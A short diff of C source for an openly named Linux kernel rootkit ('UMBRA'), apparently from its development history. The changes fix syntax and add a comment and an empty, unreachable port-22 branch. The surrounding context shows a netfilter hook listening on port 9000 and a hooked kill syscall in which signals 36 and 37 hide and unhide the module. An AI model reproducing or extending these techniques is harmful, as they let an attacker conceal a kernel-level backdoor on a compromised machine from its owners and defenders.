@@ -2,8 +2,9 @@
 
 static struct list_head *prev_module;
 static short hidden = 0;
-
-
+////////////////////////////////
+//TODO FIX ALL {} formatting
+////////////////////////////////
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
               const struct nf_hook_state *state)
@@ -44,6 +45,10 @@ static unsigned int my_nf_hookfn(void *priv,
         //printk(KERN_INFO "UMBRA:: Received packet on port %u\n", dport);
         if(dport != 9000){
             return NF_ACCEPT; //We ignore those not for port 9000
+        }
+        else if (dport == 22)
+        {
+
         }
         printk(KERN_INFO "UMBRA:: Received packet on port 9000\n");
              
@@ -157,13 +162,13 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     } 
     else if ( sig == 36 ) 
     {
-        printk(KERN_INFO "poetry: hiding\n")
+        printk(KERN_INFO "poetry: hiding\n");
         hideme();
         return 0;
     }
     else if ( sig == 37 ) 
     {
-        printk(KERN_INFO "poetry: unhiding\n")
+        printk(KERN_INFO "poetry: unhiding\n");
         showme();
         return 0;
     }
